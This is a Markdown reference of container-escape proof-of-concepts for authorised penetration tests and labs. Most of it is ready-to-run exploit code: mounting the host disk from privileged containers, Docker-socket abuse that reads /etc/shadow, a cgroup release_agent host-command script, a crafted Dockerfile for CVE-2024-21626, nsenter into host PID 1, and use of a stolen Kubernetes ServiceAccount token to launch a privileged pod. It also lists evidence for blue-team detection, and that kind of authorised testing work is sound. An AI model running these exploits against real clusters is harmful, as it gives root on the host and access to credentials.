# Container Escape PoCs — AUTHORIZED TESTING ONLY

These proof-of-concepts are for use in:
- Contracted penetration tests with written authorization
- Purpose-built vulnerable labs (HTB, THM, kata-containers test harness)
- Your own isolated test clusters

Never run against systems you do not own or have explicit permission to test.

---

## 1. `--privileged` host mount

```bash
# Inside a container started with docker run --privileged ...
# Confirm
grep CapEff /proc/self/status           # 0000003fffffffff = all caps
# Enumerate devices
fdisk -l
# Mount host root and chroot
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash
# Prove compromise
id; hostname; ls /root
```

## 2. Docker socket mount

```bash
# Pre-req: /var/run/docker.sock bind-mounted into the container
ls -l /var/run/docker.sock
docker -H unix:///var/run/docker.sock run --rm --privileged \
  -v /:/host -it alpine chroot /host /bin/sh -c 'id; cat /etc/shadow'
```

## 3. `CAP_SYS_ADMIN` cgroup v1 release_agent

Works on pre-5.8 kernels or unpatched cgroup v1 hosts (CVE-2022-0492
window).

```bash
#!/bin/sh
# Run inside container with CAP_SYS_ADMIN
set -e
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
cat > /cmd <<'SH'
#!/bin/sh
id > /output
hostname >> /output
SH
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
# Wait for release_agent to fire, then read /output (on host)
cat /output
```

## 4. runc CVE-2019-5736

Container with write access to its own `/proc/self/exe` overwrites the host
`runc` binary; next `docker exec` by an admin executes attacker code.

Reference: https://unit42.paloaltonetworks.com/breaking-out-of-coresos/

```bash
# Public PoC: https://github.com/feexd/pocs/tree/master/CVE-2019-5736
# Ensure node runc < 1.0.0-rc6; patch immediately if confirmed.
```

## 5. CVE-2024-21626 — runc "Leaky Vessels" WORKDIR FD leak

```dockerfile
# Crafted Dockerfile that exploits FD leak
FROM alpine
WORKDIR /proc/self/fd/8
```
When runc enters the container, FD 8 points to a host directory; the image
ENTRYPOINT now executes with that path as cwd.

Reference: https://snyk.io/blog/leaky-vessels-docker-runc-container-breakout-vulnerabilities/

Affected: runc <= 1.1.11, BuildKit <= 0.12.4. Patch: runc 1.1.12+ / 1.2.0+.

## 6. Host PID namespace + nsenter

```bash
# Container launched with --pid=host (or hostPID: true)
ps -ef                    # host processes visible
# If CAP_SYS_ADMIN also granted, enter PID 1's namespaces
nsenter -t 1 -m -u -i -n -p -- /bin/bash
```

## 7. Kubernetes ServiceAccount token → privileged pod

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
API=https://kubernetes.default.svc

# Can I create pods?
curl -sk -H "Authorization: Bearer $TOKEN" --cacert $CA \
  "$API/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
  -X POST -H 'Content-Type: application/json' -d '{
    "kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1",
    "spec":{"resourceAttributes":{"verb":"create","resource":"pods"}}}'

# If yes, create a privileged pod on a target node
cat <<EOF | curl -sk -H "Authorization: Bearer $TOKEN" --cacert $CA \
  -H 'Content-Type: application/yaml' \
  "$API/api/v1/namespaces/default/pods" -X POST --data-binary @-
apiVersion: v1
kind: Pod
metadata: {name: esc}
spec:
  nodeName: <target-node>
  hostPID: true
  containers:
  - name: x
    image: alpine
    command: ["nsenter", "-t", "1", "-m", "-u", "-i", "-n", "-p", "--", "/bin/sh"]
    securityContext: {privileged: true}
EOF
```

## 8. Detection Evidence to Capture

For each PoC executed under authorization, record:
- `evidence.command` — the exact invocation
- `evidence.raw_output` — proof of host access (hostname, `/etc/shadow` read)
- `affected.node` + `affected.cluster_name`
- Timestamps (start/end) for correlation with Falco/Tetragon logs
- Whether the runtime sensor *detected* the escape (blue-team feedback)

## Cleanup

Remove any scheduled tasks, dropped binaries, or test pods created during
the exercise. Document cleanup steps in the engagement report.
